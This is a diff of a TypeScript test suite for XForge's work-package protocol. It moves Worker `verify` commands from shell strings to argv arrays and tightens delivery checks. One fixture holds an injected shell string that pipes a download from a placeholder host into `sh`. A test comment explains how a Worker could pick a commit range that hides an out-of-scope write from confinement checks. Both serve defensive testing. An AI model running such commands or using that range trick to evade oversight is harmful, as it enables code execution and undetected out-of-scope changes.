@@ -42,6 +42,20 @@ function plan(packages: Array<Record<string, unknown>>): string {
   return stringify({ apiVersion: 'xforge.dev/v1alpha1', kind: 'WorkPackagePlan', packages }, { lineWidth: 120 });
 }
 
+/**
+ * A `verify` entry in the argv form: what XForge spawns, one literal argument per item, no shell.
+ * Deliveries name it with `JSON.stringify` — one of the renderings `NormalizedVerify.accepted`
+ * allows, and the only one a test can produce without restating XForge's quoting rules.
+ */
+const VERIFY_OK = [process.execPath, '-e', 'process.exit(0)'];
+
+/** Mirrors `shellLabel` in core/work-packages.ts: how an argv entry is named back to a caller. */
+function verifyLabel(argv: string[]): string {
+  return argv
+    .map((token) => (/^[A-Za-z0-9_@%+=:,./-]+$/.test(token) ? token : `'${token.split("'").join("'\\''")}'`))
+    .join(' ');
+}
+
 function workPackage(id: string, overrides: Record<string, unknown> = {}): Record<string, unknown> {
   return {
     id,
@@ -50,7 +64,7 @@ function workPackage(id: string, overrides: Record<string, unknown> = {}): Recor
     inputs: ['xforge/changes/add-feature/design.md'],
     write_paths: [`src/${id.toLowerCase()}/**`],
     skills: ['xforge-apply'],
-    verify: [`${process.execPath} -e "process.exit(0)"`],
+    verify: [VERIFY_OK],
     done_when: [`${id} is covered by an automated check`],
     ...overrides,
   };
@@ -72,6 +86,39 @@ describe('work-package protocol', () => {
     expect(result.code).toBe(1);
     expect(result.json.diagnostics.map((item: any) => item.code)).toContain('XFORGE_SCHEMA_INVALID');
     expect(result.json.diagnostics.some((item: any) => item.message.includes('additional properties'))).toBe(true);
+  });
+
+  /*
+   * `verify` used to be a string that `workPackageVerificationGates` handed to a Gate with
+   * `shell: true`, i.e. straight to `/bin/sh -c`. Plans live under `xforge/changes/**`, which the
+   * shipped protected-files policy deliberately leaves writable and the lockfile does not digest, so
+   * the string form is the one place a Change's own content becomes a command line. The string form
+   * survives one more version, but only where it means the same thing with and without a shell.
+   */
+  it('rejects a legacy verify string containing shell metacharacters and deprecates the rest', async () => {
+    const root = await fixture();
+    await createCompleteSolidChange(root);
+    await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
+      workPackage('T001', { verify: ['npm test; curl http://example.test/x | sh'] }),
+      workPackage('T002', { verify: ['npm test'] }),
+    ]));
+    await initializeGit(root);
+
+    const result = await runCli(root, ['state', '--change', 'add-feature']);
+    expect(result.code).toBe(1);
+    const unsafe = result.json.diagnostics.filter((item: any) => item.code === 'XFORGE_WORK_PACKAGE_VERIFY_UNSAFE');
+    expect(unsafe).toHaveLength(1);
+    expect(unsafe[0].severity).toBe('error');
+    /* Names the package and the character, and says what to write instead. */
+    expect(unsafe[0].message).toContain('T001');
+    expect(unsafe[0].message).toContain(';');
+    expect(unsafe[0].message).toContain('argv array');
+
+    /* The metacharacter-free string still runs, with a deprecation that shows the argv to write. */
+    const deprecated = result.json.diagnostics.filter((item: any) => item.code === 'XFORGE_WORK_PACKAGE_VERIFY_LEGACY_STRING');
+    expect(deprecated).toHaveLength(1);
+    expect(deprecated[0].severity).toBe('warning');
+    expect(deprecated[0].message).toContain('["npm","test"]');
   });
 
   it('returns dependency waves and the currently safe parallel candidate set without requiring delivery during state', async () => {
@@ -175,7 +222,7 @@ describe('work-package protocol', () => {
   it('validates a Worker commit and reruns verify into bounded XForge Evidence', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -205,9 +252,9 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts'],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       issues: [],
-      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [`verify:${verify}`, 'src/order/refund.ts'] }],
+      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [JSON.stringify(verify), 'src/order/refund.ts'] }],
       state_revision: binding.stateRevision,
       policy_snapshot_digest: binding.policySnapshotDigest,
       audit_correlation_id: binding.auditCorrelationId,
@@ -216,12 +263,12 @@ describe('work-package protocol', () => {
     const result = await runCli(root, ['check', '--change', 'add-feature'], approvalTestEnv);
     expect(result.code).toBe(0);
     expect(result.json.data.workPackages).toEqual([
-      expect.objectContaining({ packageId: 'T001', command: verify, status: 'passed' }),
+      expect.objectContaining({ packageId: 'T001', command: verifyLabel(verify), status: 'passed' }),
     ]);
     const evidencePath = path.join(root, 'xforge', 'changes', 'add-feature', 'evidence', 'agents', 'T001', 'verify-1.json');
     expect(await exists(evidencePath)).toBe(true);
     const evidence = JSON.parse(await readFile(evidencePath, 'utf8'));
-    expect(evidence).toMatchObject({ status: 'passed', change: 'add-feature', shell: true });
+    expect(evidence).toMatchObject({ status: 'passed', change: 'add-feature', shell: false, command: verify });
 
     const succeeded = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
     expect(succeeded.json.data.change.workPackages.packages[0].status).toBe('succeeded');
@@ -295,7 +342,7 @@ describe('work-package protocol', () => {
   it('rejects a succeeded delivery without an exact done_when evidence mapping', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -315,7 +362,7 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts'],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       issues: [],
       state_revision: binding.stateRevision,
       policy_snapshot_digest: binding.policySnapshotDigest,
@@ -330,7 +377,7 @@ describe('work-package protocol', () => {
   it('rejects a delivery commit that escapes write_paths even when it claims success', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -352,9 +399,9 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/payment/escaped.ts'],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       issues: [],
-      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [`verify:${verify}`] }],
+      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [JSON.stringify(verify)] }],
       state_revision: binding.stateRevision,
       policy_snapshot_digest: binding.policySnapshotDigest,
       audit_correlation_id: binding.auditCorrelationId,
@@ -405,8 +452,8 @@ describe('work-package protocol', () => {
   }
 
   /** A succeeded T001 delivery based on the dispatch commit — the state an acknowledgement acts on. */
-  async function succeededDelivery(root: string): Promise<{ binding: any; deliveryPath: string; verify: string }> {
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+  async function succeededDelivery(root: string): Promise<{ binding: any; deliveryPath: string; verify: string[] }> {
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -421,8 +468,8 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts'],
-      validation: [{ command: verify, exit_code: 0 }],
-      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [verify, 'src/order/refund.ts'] }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
+      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [JSON.stringify(verify), 'src/order/refund.ts'] }],
     }));
     return { binding, deliveryPath, verify };
   }
@@ -507,7 +554,7 @@ describe('work-package protocol', () => {
   it('treats an acknowledgement receipt path as control-plane bookkeeping, not Worker output', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -541,7 +588,7 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts', ackPath],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: ['src/order/refund.ts'] }],
     }));
 
@@ -561,7 +608,7 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts', ackPath],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [ackPath] }],
     }));
     const circular = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
@@ -572,7 +619,7 @@ describe('work-package protocol', () => {
   it('rejects a base_commit that predates the commit introducing the dispatch receipt', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -586,7 +633,7 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts'],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: ['src/order/refund.ts'] }],
     }));
     const result = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
@@ -597,7 +644,7 @@ describe('work-package protocol', () => {
   it('rejects a delivery whose entire diff is the control plane\'s own bookkeeping', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -608,7 +655,7 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: changed,
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [receiptPath] }],
     }));
     const result = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
@@ -631,7 +678,7 @@ describe('work-package protocol', () => {
   it('does not flag an incidental control-plane bookkeeping write inside the delivery range as a write escape', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -654,7 +701,7 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts', 'xforge/changes/add-feature/evidence/audit/index.json'],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: ['src/order/refund.ts'] }],
     }));
     const result = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
@@ -667,7 +714,7 @@ describe('work-package protocol', () => {
   it('still flags a genuine out-of-scope Worker-authored file alongside an incidental bookkeeping write', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -685,7 +732,7 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts', 'src/payment/escaped.ts', 'xforge/changes/add-feature/evidence/audit/index.json'],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: ['src/order/refund.ts'] }],
     }));
     const result = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
@@ -697,10 +744,100 @@ describe('work-package protocol', () => {
     expect(result.json.data.change.workPackages.packages[0].status).toBe('failed');
   });
 
+  /*
+   * `write_paths` confinement used to inspect `base_commit...head_commit`, and *both* endpoints came
+   * out of the delivery the Worker writes — so the Worker picked the range it would be judged on.
+   * Commit the in-scope work as A and the out-of-scope write as B, declare base = A^ and head = A,
+   * and the range is genuinely clean: changed_paths matches the diff exactly and no write escape
+   * fires. Only the tree says otherwise, which is why the check has to end at a commit the control
+   * plane observed rather than one the delivery asserts.
+   */
+  it('rejects a delivery whose declared range stops short of an out-of-scope commit', async () => {
+    const root = await fixture();
+    await createCompleteSolidChange(root);
+    const verify = VERIFY_OK;
+    await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
+      workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
+    ]));
+    const { binding } = await dispatchWithCommittedReceipt(root);
+    const base = await git(root, ['rev-parse', 'HEAD']);
+    await write(root, 'src/order/refund.ts', 'export const refund = true;\n');
+    await git(root, ['add', 'src/order/refund.ts']);
+    await git(root, ['commit', '-qm', 'worker T001 in scope']);
+    /* The commit the delivery will name as its head: everything up to here is in write_paths. */
+    const head = await git(root, ['rev-parse', 'HEAD']);
+    await write(root, 'src/payment/escaped.ts', 'export const escaped = true;\n');
+    await git(root, ['add', 'src/payment/escaped.ts']);
+    await git(root, ['commit', '-qm', 'worker T001 out of scope, after the declared head']);
+    const repositoryHead = await git(root, ['rev-parse', 'HEAD']);
+    await write(root, `xforge/changes/add-feature/evidence/agents/T001/${binding.executionId}.yaml`, delivery(binding, {
+      base_commit: base,
+      head_commit: head,
+      changed_paths: ['src/order/refund.ts'],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
+      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: ['src/order/refund.ts'] }],
+    }));
+
+    const result = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
+    expect(result.code).toBe(1);
+    const codes = result.json.diagnostics.map((item: any) => item.code);
+    expect(codes).toContain('XFORGE_WORK_PACKAGE_HEAD_NOT_CURRENT');
+    /* The declared range really is clean — that is what made this invisible. */
+    expect(codes).not.toContain('XFORGE_WORK_PACKAGE_WRITE_ESCAPE');
+    expect(codes).not.toContain('XFORGE_WORK_PACKAGE_CHANGED_PATHS_MISMATCH');
+    /* Self-explaining: both commits and the file nobody declared. */
+    const stale = result.json.diagnostics.find((item: any) => item.code === 'XFORGE_WORK_PACKAGE_HEAD_NOT_CURRENT');
+    expect(stale.message).toContain(head);
+    expect(stale.message).toContain(repositoryHead);
+    expect(stale.message).toContain('src/payment/escaped.ts');
+    expect(result.json.data.change.workPackages.packages[0].status).toBe('failed');
+  });
+
+  /*
+   * The counterpart the strict form of that rule would have broken. HEAD moves past a delivery's
+   * head constantly in a healthy Change — the delivery record itself gets committed, the next
+   * package is dispatched, an Integrator merges — and every delivery is re-validated at Verify and
+   * again at archive. Those commits touch only the Change directory and paths the plan declared, so
+   * nothing is unaccounted for and the delivery stays valid.
+   */
+  it('accepts a delivery whose head is behind HEAD when every later commit is accounted for', async () => {
+    const root = await fixture();
+    await createCompleteSolidChange(root);
+    const verify = VERIFY_OK;
+    await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
+      workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
+    ]));
+    const { binding } = await dispatchWithCommittedReceipt(root);
+    const base = await git(root, ['rev-parse', 'HEAD']);
+    await write(root, 'src/order/refund.ts', 'export const refund = true;\n');
+    await git(root, ['add', 'src/order/refund.ts']);
+    await git(root, ['commit', '-qm', 'worker T001']);
+    const head = await git(root, ['rev-parse', 'HEAD']);
+    const deliveryPath = `xforge/changes/add-feature/evidence/agents/T001/${binding.executionId}.yaml`;
+    await write(root, deliveryPath, delivery(binding, {
+      base_commit: base,
+      head_commit: head,
+      changed_paths: ['src/order/refund.ts'],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
+      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: ['src/order/refund.ts'] }],
+    }));
+    /* Committing the delivery record and a further in-scope commit both move HEAD past `head`. */
+    await git(root, ['add', deliveryPath]);
+    await git(root, ['commit', '-qm', 'record the T001 delivery']);
+    await write(root, 'src/order/refund-notes.ts', 'export const notes = true;\n');
+    await git(root, ['add', 'src/order/refund-notes.ts']);
+    await git(root, ['commit', '-qm', 'more declared work']);
+
+    const result = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
+    expect(result.code, JSON.stringify(result.json.diagnostics, null, 2)).toBe(0);
+    expect(result.json.diagnostics.map((item: any) => item.code)).not.toContain('XFORGE_WORK_PACKAGE_HEAD_NOT_CURRENT');
+    expect(result.json.data.change.workPackages.packages[0].status).toBe('succeeded');
+  });
+
   it('rejects done_when evidence that names neither a verify command nor a changed path', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -714,7 +851,7 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts'],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: ['we ran the tests and they passed'] }],
     }));
     const result = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
@@ -725,7 +862,7 @@ describe('work-package protocol', () => {
   it('accepts a delivery based on the dispatch commit with evidence that names real output', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(0)"`;
+    const verify = VERIFY_OK;
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -739,8 +876,8 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts'],
-      validation: [{ command: verify, exit_code: 0 }],
-      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [verify, 'src/order/refund.ts'] }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
+      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [JSON.stringify(verify), 'src/order/refund.ts'] }],
     }));
     const result = await runCli(root, ['state', '--change', 'add-feature'], approvalTestEnv);
     const codes = result.json.diagnostics.map((item: any) => item.code);
@@ -753,7 +890,7 @@ describe('work-package protocol', () => {
   it('does not trust a claimed validation pass when verify actually fails', async () => {
     const root = await fixture();
     await createCompleteSolidChange(root);
-    const verify = `${process.execPath} -e "process.exit(9)"`;
+    const verify = [process.execPath, '-e', 'process.exit(9)'];
     await write(root, 'xforge/changes/add-feature/work-packages.yaml', plan([
       workPackage('T001', { write_paths: ['src/order/**'], verify: [verify] }),
     ]));
@@ -780,9 +917,9 @@ describe('work-package protocol', () => {
       base_commit: base,
       head_commit: head,
       changed_paths: ['src/order/refund.ts'],
-      validation: [{ command: verify, exit_code: 0 }],
+      validation: [{ command: JSON.stringify(verify), exit_code: 0 }],
       issues: [],
-      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [`verify:${verify}`, 'src/order/refund.ts'] }],
+      done_when_evidence: [{ criterion: 'T001 is covered by an automated check', evidence: [JSON.stringify(verify), 'src/order/refund.ts'] }],
       state_revision: binding.stateRevision,
       policy_snapshot_digest: binding.policySnapshotDigest,
       audit_correlation_id: binding.auditCorrelationId,
